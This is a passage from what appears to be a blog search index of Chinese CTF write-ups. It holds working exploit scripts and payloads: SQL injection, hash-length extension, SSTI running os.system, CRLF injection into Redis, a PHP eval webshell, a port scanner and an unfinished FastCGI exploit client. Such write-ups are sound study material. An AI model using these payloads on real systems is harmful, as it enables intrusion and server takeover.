$_SESSION[&#x27;login&#x27;] = 1; $_SESSION[&#x27;user&#x27;] = $username; header(&#x27;Location:/riji.php&#x27;); &#125; else &#123; echo(&quot;&lt;script&gt;alert(&#x27;Password Worng?&#x27;)&lt;/script&gt;&quot;); &#125; &#125; else &#123; echo(&quot;&lt;script&gt;alert(&#x27;Username Worng?&#x27;)&lt;/script&gt;&quot;); &#125;&#125; 我们Base64解码一下就OK了。生成的结果传给api.php/?api=就行了，需要注意的是api.php在开头设置了$_SESSION['login']==1的判断，因此我们需要另外起一个窗口发api.php，然后我们返回最开始的登录页面，发现登录状态没有消失，这时SQL注入可以利用了，正常SQL注入流程，除引号外没有任何过滤。提交/riji.php?id=-1 union select 1,2,flag from flag就可以得到flag了。 PoC： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101import requestsfrom base64 import b64decodefrom urllib.parse import unquote, parse_qsimport randomimport stringimport subprocessimport osaddr = &quot;http://192.168.1.4:5354/&quot;a = requests.session()def register(a: requests.Session) -&gt; str: username = &quot;&quot;.join(random.sample(string.ascii_letters, 6)) b = a.post(addr + &quot;index.php&quot;, data=&#123; &quot;username&quot;: username, &quot;password&quot;: &quot;test1&quot;, &quot;mibao&quot;: &quot;test1&quot;, &quot;regi&quot;: &quot;1&quot; &#125;) print(b.text) print(&quot;Username is &quot; + username) return usernamedef login(a: requests.Session, username: str) -&gt; int: b = a.post(addr + &quot;index.php&quot;, data=&#123; &quot;username&quot;: username, &quot;password&quot;: &quot;test1&quot;, &quot;mibao&quot;: &quot;test1&quot;, &quot;login&quot;: &quot;1&quot; &#125;) print(b.text) userid = (b64decode(unquote(a.cookies.get(&#x27;user&#x27;)).encode())[ :b64decode(unquote(a.cookies.get(&#x27;user&#x27;)).encode()).find(username.encode())]) # userid=b64decode(unquote(a.cookies.get(&#x27;user&#x27;)).encode()).find(username.encode()) print(userid.decode()) return int(userid.decode())def get_admin_md5() -&gt; int: a = requests.post(addr + &quot;forget.php&quot;, data=&#123; &quot;username&quot;: &quot;admin&quot;, &quot;mibao&quot;: &quot;mibao&quot;, &quot;pass&quot;: &quot;3werwer&quot;, &quot;forget&quot;: &quot;1&quot; &#125;, allow_redirects=False) md5 = b64decode(parse_qs(a.headers[&#x27;Location&#x27;])[&#x27;check&#x27;][0]) print(md5.decode()) return md5.decode()def get_fake_md5(md5: str) -&gt; dict: result = subprocess.getoutput(&quot;python2 md5pad.py &#123;0&#125; admin 16&quot;.format(md5)) print(result) final = dict() payload = result.splitlines()[0] final[&#x27;payload&#x27;] = payload[11:-6] final[&#x27;md5&#x27;] = result.splitlines()[2][5:] print(final) return finaldef send_api(result: dict, userid: int): php_content = r&#x27;&#x27;&#x27;class admin&#123; var $name = &quot;admin&quot;; var $check = &quot;%s&quot;; var $data = &quot;%s&quot;; var $method = &quot;del_user&quot;; var $userid = %d; var $msgid;&#125;$a = serialize(new admin());echo base64_encode($a);&#x27;&#x27;&#x27;%(result[&#x27;md5&#x27;], result[&#x27;payload&#x27;], userid) file = open(&quot;tmp.php&quot;, &#x27;w&#x27;) file.write(php_content) payload = subprocess.getoutput(&quot;php -r &#x27;&#123;0&#125;&#x27;&quot;.format(php_content)) print(payload) a = requests.get(addr + &quot;api.php&quot;, params=&#123; &quot;api&quot;: payload &#125;) print(a.text)def sql_inj(a: requests.Session): b = a.get(addr + &quot;riji.php&quot;, params=&#123; &quot;id&quot;: &quot;-1 union select 1,2,flag from flag&quot; &#125;) print(b.text)if __name__ == &quot;__main__&quot;: username = register(a) userid = login(a, username) admin_md5 = get_admin_md5() result=get_fake_md5(admin_md5) send_api(result,userid) sql_inj(a) flag{0aa97a23-a64f-415c-a75e-40b7ce271d38}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"哈希扩展攻击","slug":"哈希扩展攻击","permalink":"http://tiaonmmn.github.io/tags/%E5%93%88%E5%B8%8C%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"}]},{"title":"HarekazeCTF2019-A_Z","slug":"HarekazeCTF2019-A-Z","date":"2019-09-12T14:34:16.000Z","updated":"2019-12-10T12:15:12.663Z","comments":true,"path":"2019/09/12/HarekazeCTF2019-A-Z/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/12/HarekazeCTF2019-A-Z/","excerpt":"久违的Misc。NodeJS写的网站，给了源码：","text":"久违的Misc。NodeJS写的网站，给了源码： 123456789101112131415161718192021222324252627282930313233343536const express = require(&#x27;express&#x27;);const path = require(&#x27;path&#x27;);const vm = require(&#x27;vm&#x27;);const app = express();app.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));app.set(&#x27;view engine&#x27;, &#x27;pug&#x27;);app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));app.get(&#x27;/&#x27;, function (req, res, next) &#123; let output = &#x27;&#x27;; const code = req.query.code + &#x27;&#x27;; if (code &amp;&amp; code.length &lt; 200 &amp;&amp; !/[^a-z().]/.test(code)) &#123; try &#123; const result = vm.runInNewContext(code, &#123;&#125;, &#123; timeout: 500 &#125;); if (result === 1337) &#123; output = process.env.FLAG; &#125; else &#123; output = &#x27;nope&#x27;; &#125; &#125; catch (e) &#123; output = &#x27;nope&#x27;; &#125; &#125; else &#123; output = &#x27;nope&#x27;; &#125; res.render(&#x27;index&#x27;, &#123; title: &#x27;[a-z().]&#x27;, output &#125;);&#125;);app.get(&#x27;/source&#x27;, function (req, res) &#123; res.sendFile(path.join(__dirname, &#x27;app.js&#x27;));&#125;);module.exports = app; 我们被要求只能使用[a-z().]这些字符来输出1337，就会返回flag。 我们可以用(typeof(this)).constructor()构造出空字符串，而JS中1==true，所以(typeof(this)).constructor().length.constructor(true)就会构造出1，或者true.constructor.length。3可以用字符串的big()方法的name.length获得，7可以用true.constructor.name.length得到。最后将所有字符concat在一起即可。 所以最后Payload（不唯一）：eval((typeof(this)).constructor().concat(true.constructor.length).concat((typeof(this)).big.name.length).concat((typeof(this)).big.name.length).concat(true.constructor.name.length)) flag{37fc4573-3305-486f-bcee-f7f8dbad3aa8}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/tags/Misc/"},{"name":"NodeJS","slug":"NodeJS","permalink":"http://tiaonmmn.github.io/tags/NodeJS/"}]},{"title":"SWPUCTF-2016-Web7","slug":"SWPUCTF-2016-Web7","date":"2019-09-12T01:33:42.000Z","updated":"2020-09-01T13:16:10.349Z","comments":true,"path":"2019/09/12/SWPUCTF-2016-Web7/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/12/SWPUCTF-2016-Web7/","excerpt":"SWPUCTF 2016的Web7，老题了。不过题目环境有点苛刻。Python 2.7.5+Redis 2.6。毕竟出题时是2016年。 给出了源码：","text":"SWPUCTF 2016的Web7，老题了。不过题目环境有点苛刻。Python 2.7.5+Redis 2.6。毕竟出题时是2016年。 给出了源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!/usr/bin/python # coding:utf8import cherrypyimport urllib2import redisclass web7: @cherrypy.expose def index(self): return &quot;&lt;script&gt; window.location.href=&#x27;/input&#x27;;&lt;/script&gt;&quot; @cherrypy.expose def input(self,url=&quot;&quot;,submit=&quot;&quot;): file=open(&quot;index.html&quot;,&quot;r&quot;).read() reheaders=&quot;&quot; if cherrypy.request.method==&quot;GET&quot;: reheaders=&quot;&quot; else: url=cherrypy.request.params[&quot;url&quot;] submit=cherrypy.request.params[&quot;submit&quot;] try: for x in urllib2.urlopen(url).info().headers: reheaders=reheaders+x+&quot;&lt;br&gt;&quot; except Exception,e: reheaders=&quot;错误&quot;+str(e) for x in urllib2.urlopen(url).info().headers: reheaders=reheaders+x+&quot;&lt;br&gt;&quot; file=file.replace(&quot;&lt;?response?&gt;&quot;,reheaders) return file @cherrypy.expose def login(self,password=&quot;&quot;,submit=&quot;&quot;): pool = redis.ConnectionPool(host=&#x27;127.0.0.1&#x27;, port=6379) r = redis.Redis(connection_pool=pool) re=&quot;&quot; file=open(&quot;login.html&quot;,&quot;r&quot;).read() if cherrypy.request.method==&quot;GET&quot;: re=&quot;&quot; else: password=cherrypy.request.params[&quot;password&quot;] submit=cherrypy.request.params[&quot;submit&quot;] if r.get(&quot;admin&quot;)==password: re=open(&quot;flag&quot;,&#x27;r&#x27;).readline() else: re=&quot;Can&#x27;t find admin:&quot;+password+&quot;,fast fast fast.....&quot; file=file.replace(&quot;&lt;?response?&gt;&quot;,re) return filecherrypy.config.update(&#123;&#x27;server.socket_host&#x27;: &#x27;0.0.0.0&#x27;, &#x27;server.socket_port&#x27;: 8080, &#125;)cherrypy.quickstart(web7(),&#x27;/&#x27;) 我们有两个输入点，一个/input允许我们输入URL，然后会用urllib2.urlopen()访问我们的URL。还有一个/login，要求我们输入管理员的密码，如果与Redis数据库中的密码相同，我们就可以拿到Flag。 好了，看起来没有什么问题，SSRF。然后问题来了，urllib2.urlopen()只支持HTTP HTTPS FTP File这几种Schema，我们没法用gopher，也就没法打到Redis。然后我们就试图搜一下urllib2.urlopen()是不是出过什么洞，然后就找到这个。简单来说，就是urlopen()处理URL的时候没有考虑换行符，导致我们可以在正常的HTTP头中插入任意内容。就像这样： 123456789urlopen(&quot;http://127.0.0.1%0D%0A%20SLAVEOF . . . :6379/&quot;)&gt;&gt;&gt; pprint(conn.recv(300).splitlines(keepends=True))[b&#x27;GET / HTTP/1.1\\r\\n&#x27;, b&#x27;Accept-Encoding: identity\\r\\n&#x27;, b&#x27;Host: 127.0.0.1\\r\\n&#x27;, b&#x27; SLAVEOF . . . :6379\\r\\n&#x27;, b&#x27;Connection: close\\r\\n&#x27;, b&#x27;User-Agent: Python-urllib/2.7\\r\\n&#x27;, b&#x27;\\r\\n&#x27;] 好了，我们只要在正常URL中插入%0d%0a就可以了。所以我们的思路其实非常简单：向Redis写数据，改掉admin的密码就好了。Redis改数据用set指令就好了。然后换行用%0d%0a。所以，Payload：http://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/foo 然后我们登录/login，输入admin就可以了。不过动作要快，因为admin密码会定时修改。 P.S. 根据这篇文章的思路没什么问题，但是我没有搞明白为什么要改数据库的位置。 flag{e48f5fcb-2ca6-471e-a1e1-c7fbb82d8bfb}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"Redis","slug":"Redis","permalink":"http://tiaonmmn.github.io/tags/Redis/"},{"name":"SSRF","slug":"SSRF","permalink":"http://tiaonmmn.github.io/tags/SSRF/"},{"name":"Cherrypy","slug":"Cherrypy","permalink":"http://tiaonmmn.github.io/tags/Cherrypy/"},{"name":"CVE-2016-5699","slug":"CVE-2016-5699","permalink":"http://tiaonmmn.github.io/tags/CVE-2016-5699/"},{"name":"CRLF Injection","slug":"CRLF-Injection","permalink":"http://tiaonmmn.github.io/tags/CRLF-Injection/"}]},{"title":"PASECACTF 2019 Tornado_Casino","slug":"PASECACTF-2019-Tornado-Casino","date":"2019-09-10T08:30:34.000Z","updated":"2020-03-05T07:21:37.852Z","comments":true,"path":"2019/09/10/PASECACTF-2019-Tornado-Casino/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/10/PASECACTF-2019-Tornado-Casino/","excerpt":"久违的来一道Crypto。 给出了代码：","text":"久违的来一道Crypto。 给出了代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394from sys import argvfrom random import getrandbitsflag = &#x27;&lt;redacted&gt;&#x27;tornado_banner = &#x27;&#x27;&#x27; 88 ,d 88 88 88 MM88MMM ,adPPYba, 8b,dPPYba, 8b,dPPYba, ,adPPYYba, ,adPPYb,88 ,adPPYba, 88 a8&quot; &quot;8a 88P&#x27; &quot;Y8 88P&#x27; `&quot;8a &quot;&quot; `Y8 a8&quot; `Y88 a8&quot; &quot;8a 88 8b d8 88 88 88 ,adPPPPP88 8b 88 8b d8 88, &quot;8a, ,a8&quot; 88 88 88 88, ,88 &quot;8a, ,d88 &quot;8a, ,a8&quot; &quot;Y888 `&quot;YbbdP&quot;&#x27; 88 88 88 `&quot;8bbdP&quot;Y8 `&quot;8bbdP&quot;Y8 `&quot;YbbdP&quot;&#x27; &#x27;&#x27;&#x27;casino_banner = &#x27;&#x27;&#x27; 88 &quot;&quot; ,adPPYba, ,adPPYYba, ,adPPYba, 88 8b,dPPYba, ,adPPYba, a8&quot; &quot;&quot; &quot;&quot; `Y8 I8[ &quot;&quot; 88 88P\\&#x27; `&quot;8a a8&quot; &quot;8a 8b ,adPPPPP88 `&quot;Y8ba, 88 88 88 8b d8 &quot;8a, ,aa 88, ,88 aa ]8I 88 88 88 &quot;8a, ,a8&quot; `&quot;Ybbd8&quot;&#x27; `&quot;8bbdP&quot;Y8 `&quot;YbbdP&quot;\\&#x27; 88 88 88 `&quot;YbbdP&quot;\\&#x27; &#x27;&#x27;&#x27;tornado_art = &#x27;&#x27;&#x27; (( &quot;####@@!!$$ )) `#####@@!$$` )) (( &#x27;####@!!$: (( ,####@!!$: )) .###@!!$: `##@@!$: `#@!!$ !@# `#@!$: @#$ #$ `#@!$: !@! &#x27;@!$: &#x27;`\\ &quot;!$: /`&#x27; &#x27;\\ &#x27;!: /&#x27; &quot;\\ : /&quot; -.&quot;-/\\\\\\-.&quot;//.-&quot;/:`\\.&quot;-.JrS&quot;.&quot;-=_\\\\&quot; -.&quot;-.\\\\&quot;-.&quot;//.-&quot;.`-.&quot;_\\\\-.&quot;.-\\&quot;.-//&#x27;&#x27;&#x27;welcome = &#x27;Welcome!\\n[1] - To slotmachine\\n[2] - Enter promocode\\n[3] - Exit\\n&#x27;&#x27;&#x27;def sltmchn_wndw(num): print(num) return &#x27;|&#x27; + &#x27;|&#x27;.join(list(hex(num)[2:].zfill(8))) + &#x27;|&#x27;slotmachine_menu = &#x27;[$] - $$$SPIN$$$\\n&#x27;print(tornado_banner)print(casino_banner)print(tornado_art)user_balance = 10#$promo = &#x27;&#x27;while True: choice1 = input(welcome) if choice1 == &#x27;1&#x27;: print(&#x27;$$$Its point of no return!$$$\\n$$$ all or nothing $$$\\n&#x27;) print(f&#x27;Your balance: &#123;user_balance&#125;&#x27;) while True: if user_balance &gt; 0: spin = input(slotmachine_menu) if spin == &#x27;$&#x27;: state = getrandbits(32) try: pff_try = int(input(&#x27;It will be: &#x27;), 16) except: exit(0) if pff_try == state: print(sltmchn_wndw(state)) print(&#x27;OMGWTF$$$$$$$$$$$$&#x27;) print(flag) exit(0) else: print(sltmchn_wndw(state)) print(&#x27;Nice try!&#x27;) user_balance -= 1 print(f&#x27;Your balance: &#123;user_balance&#125;&#x27;) else: exit(0) else: print(&#x27;Sorry!&#x27;) exit(0) elif choice1 == &#x27;2&#x27;: if not promo: promo = input(&#x27;Enter your promocode: &#x27;) if promo == &#x27;b33_1_4m_b3333&#x27;: print(&#x27;Great!&#x27;) user_balance += 1000#$ else: print(&#x27;Only once!&#x27;) elif choice1 == &#x27;3&#x27;: exit(0) 流程很简单，每次他会用random.getrandbits(32)来生成随机数，我们只要猜中就会得到flag。 之前我们提到过，Python中random.getrandbits()使用的是MT19937算法，因此我们只要获得连续的624组随机数数据，我们就可以准确获得下一个。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *from mt19937predictor import MT19937Predictorip = &#x27;127.0.0.1&#x27;port = &#x27;25028&#x27;c = connect(ip, port)print(type(c))context.log_level = &#x27;debug&#x27;predictor = MT19937Predictor()def promo(c): c.recvuntil(&quot;Welcome&quot;) c.recvline() c.recvline() c.recvline() c.recvline() c.sendline(&#x27;2&#x27;) c.recvuntil(&#x27;Enter your promocode:&#x27;) c.sendline(&quot;b33_1_4m_b3333&quot;) print(c.recvline())result = []def attack(c): c.sendline(&quot;1&quot;) c.recvline() for i in range(625): c.sendline(&#x27;$&#x27;) c.recvuntil(&#x27;It will be:&#x27;) c.sendline(&#x27;1&#x27;) temp_result = c.recvline() result.append(int(temp_result[:-1].replace(&#x27;|&#x27;, &quot;&quot;),16))if __name__==&quot;__main__&quot;: promo(c) attack(c) for i in range(625): predictor.setrandbits(result[i],32) print(result) final=predictor.getrandbits(32) c.sendline(&#x27;$&#x27;) c.recvuntil(&#x27;It will be:&#x27;) c.sendline(hex(final)[2:]) print(c.recvline()) flag{6169ce2a-c2f5-46cf-9094-fa83b3b3c066}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tiaonmmn.github.io/tags/Crypto/"},{"name":"MT19937","slug":"MT19937","permalink":"http://tiaonmmn.github.io/tags/MT19937/"}]},{"title":"PASECACTF 2019 Flask_SSTI","slug":"PASECACTF-2019-Flask-SSTI","date":"2019-09-10T07:58:28.000Z","updated":"2019-12-10T12:15:12.669Z","comments":true,"path":"2019/09/10/PASECACTF-2019-Flask-SSTI/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/10/PASECACTF-2019-Flask-SSTI/","excerpt":"一道Flask SSTI的题。 打开后允许我们输入东西，会返回用奇怪字符包裹的昵称。 我们试一下{{1*2}}，然后返回2。那么有SSTI。我们读一下config，提交{{config}}。返回结果中确实有flag，但是是乱码。看来要读一下文件了。","text":"一道Flask SSTI的题。 打开后允许我们输入东西，会返回用奇怪字符包裹的昵称。 我们试一下{{1*2}}，然后返回2。那么有SSTI。我们读一下config，提交{{config}}。返回结果中确实有flag，但是是乱码。看来要读一下文件了。 Fuzz一下，发现_、.和'不让用，那就用这个吧：{{()[\"\\x5F\\x5Fclass\\x5F\\x5F\"][\"\\x5F\\x5Fbases\\x5F\\x5F\"][0][\"\\x5F\\x5Fsubclasses\\x5F\\x5F\"]()[80][\"load\\x5Fmodule\"](\"os\")[\"system\"](\"ls\")}}，其中[80]指的是_frozen_importlib.BuiltinImporter。这样我们不会得到输出，但我们可以借助外部VPS，wget一个文件。 然后我们得到app.py，读文件。{{()[\"\\x5F\\x5Fclass\\x5F\\x5F\"][\"\\x5F\\x5Fbases\\x5F\\x5F\"][0][\"\\x5F\\x5Fsubclasses\\x5F\\x5F\"]()[91][\"get\\x5Fdata\"](0, \"app\\x2Epy\")}}，就可以得到app.py文件内容。反推flag即可。 flag{cf97ac55-0329-4867-bbbe-2fad08c6009b}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"SSTI","slug":"SSTI","permalink":"http://tiaonmmn.github.io/tags/SSTI/"},{"name":"Flask","slug":"Flask","permalink":"http://tiaonmmn.github.io/tags/Flask/"}]},{"title":"BUUOJ刷题-Web-ctf473831530_2018_web_virink_web","slug":"BUUOJ刷题-Web-ctf473831530-2018-web-virink-web","date":"2019-09-09T04:21:12.000Z","updated":"2019-12-10T12:15:12.596Z","comments":true,"path":"2019/09/09/BUUOJ刷题-Web-ctf473831530-2018-web-virink-web/","link":"","permalink":"http://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/","excerpt":"这题是CTF学习交流群（473831530）的入群题。上来就给了源码啊。","text":"这题是CTF学习交流群（473831530）的入群题。上来就给了源码啊。 1234567891011&lt;?php $sandbox = &#x27;/www/sandbox/&#x27; . md5(&#x27;orange&#x27; . $_SERVER[&#x27;REMOTE_ADDR&#x27;]); mkdir($sandbox); chdir($sandbox); if (isset($_GET[&#x27;cmd&#x27;]) &amp;&amp; strlen($_GET[&#x27;cmd&#x27;]) &lt;= 20) &#123; exec($_GET[&#x27;cmd&#x27;]); &#125; else if (isset($_GET[&#x27;reset&#x27;])) &#123; exec(&#x27;/bin/rm -rf &#x27; . $sandbox); &#125; echo &quot;&lt;br /&gt; IP : &#123;\\$_SERVER[&#x27;REMOTE_ADDR&#x27;]&#125;&quot;;?&gt; 20个字符的命令执行，而且要跨机器操作，我们是一定需要一个Webshell的。可是写不进去。参考这个和这个，我们思路就明确了：利用1=&gt;filename的特性创建特殊的文件，然后ls -tr列文件拼出完整的shell。ls -tr是按照文件创建时间顺序倒序列文件。由于我们的Shell带有大量特殊字符，考虑转义的问题，我们再套一层echo即可。 即我们要写入的内容是echo '&lt;?php eval($_GET[c]);' &gt; 2.txt，可以拆成如下几段： echo\\ \\\\ \\'\\&lt;\\?php \\\\ eval\\( \\$_GET\\[c\\]\\) \\;\\'\\&gt;2.txt 每一个文件名中有空格的都需要在行尾加上\\\\。 我们来试一下效果： 123456789101112131415161718192021222324252627282930import requestsbase_url = &#x27;http://a40430ad-39b5-4020-a550-14afee81e640.node1.buuoj.cn&#x27;def exec_cmd2(c): # exec cmd my_params = &#123; &#x27;cmd&#x27;: c &#125; r = requests.get(base_url, params=my_params) print(&#x27;exec cmd2&#x27;, c, r)def write_webshell(): filename = [r&#x27;&gt;echo\\ \\\\&#x27;, r&quot;&gt;\\&#x27;\\&lt;\\?php \\\\&quot;, r&#x27;&gt;eval\\(&#x27;, r&#x27;&gt;\\$_GET\\[c\\]\\)&#x27;, r&quot;&gt;\\;\\&#x27;\\&gt;2.php&quot;] for i in filename: my_params = &#123; &#x27;cmd&#x27;: i &#125; r = requests.get(base_url, params=my_params) print(i, r.status_code) cmd_list = [&#x27;ls -tr&gt;1.sh&#x27;, &#x27;sh 1.sh&#x27;] for i in cmd_list: exec_cmd2(i)if __name__ == &#x27;__main__&#x27;: write_webshell() print(&#x27;ok&#x27;) 访问/sandbox/XXX/2.php即可拿到Shell。我们cat /flag发现是个假的。下一步扫一下内网。Hint中提示我们可以用Python3。然而发现脚本太慢了，我就手动扫了，做题时服务器IP是172.64.152.3，然后发现172.64.152.4有HTTP回应。我们扫端口。 12345678910111213141516171819import socketdef foo(): with open(&#x27;active_port.txt&#x27;,&#x27;at&#x27;) as f: for i in range(65535+1): ip = &#x27;172.64.152.4&#x27; try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip,i)) s.close() f.writelines(str(i)+&#x27;\\n&#x27;) except socket.error: pass f.close() passif __name__ == &#x27;__main__&#x27;: foo() print(&#x27;ok&#x27;) 然后发现80 873 9000端口开放。873对应Rsync，9000对应FPM。我们先试试9000的FPM漏洞。参考这个。ExP如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252import socketimport randomimport argparseimport sysfrom io import BytesIO# Referrer: https://github.com/wuyunfeng/Python-FastCGI-ClientPY2 = True if sys.version_info.major == 2 else Falsedef bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i])def bord(c): if isinstance(c, int): return c else: return ord(c)def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode(&#x27;utf-8&#x27;, &#x27;strict&#x27;)def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, &#x27;utf-8&#x27;, &#x27;strict&#x27;) else: s = str(s) return sclass FastCGIClient: &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot; # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b&#x27;&#x27; if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header[&#x27;version&#x27;] = bord(stream[0]) header[&#x27;type&#x27;] = bord(stream[1]) header[&#x27;requestId&#x27;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header[&#x27;contentLength&#x27;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header[&#x27;paddingLength&#x27;] = bord(stream[6]) header[&#x27;reserved&#x27;] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record[&#x27;content&#x27;] = b&#x27;&#x27; if &#x27;contentLength&#x27; in record.keys(): contentLength = int(record[&#x27;contentLength&#x27;]) record[&#x27;content&#x27;] += buffer.read(contentLength) if &#x27;paddingLength&#x27; in record.keys(): skiped = buffer.read(int(record[&#x27;paddingLength&#x27;])) return record def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;): if not self.__connect(): print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;) return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b&quot;&quot; beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b&#x27;&#x27; if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#x27;&#x27;, requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#x27;&#x27;, requestId) self.sock.send(request) self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27; return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b&#x27;&#x27; while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests[&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response[&#x27;requestId&#x27;]): self.requests[requestId][&#x27;response&#x27;] += response[&#x27;content&#x27;] if response[&#x27;type&#x27;] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId][&#x27;response&#x27;] def 